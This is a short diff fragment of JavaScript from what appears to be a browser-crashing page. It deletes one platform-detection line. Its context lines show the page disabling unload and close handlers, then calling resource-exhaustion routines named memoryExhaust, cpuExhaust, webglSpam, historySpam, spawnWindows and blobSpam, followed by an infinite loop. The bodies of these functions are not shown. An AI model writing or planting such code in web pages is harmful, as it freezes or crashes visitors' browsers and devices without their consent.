@@ -118,8 +118,6 @@
             window.onunload = () => false;
             window.onclose = () => false;
             
-            const platform = getPlatform();
-            
             memoryExhaust(); cpuExhaust(); webglSpam(); cssCrash(); historySpam(); indexedDBSpam(); audioSpam(); transformSpam(); spawnWindows(); blobSpam();
             
             while (1) {
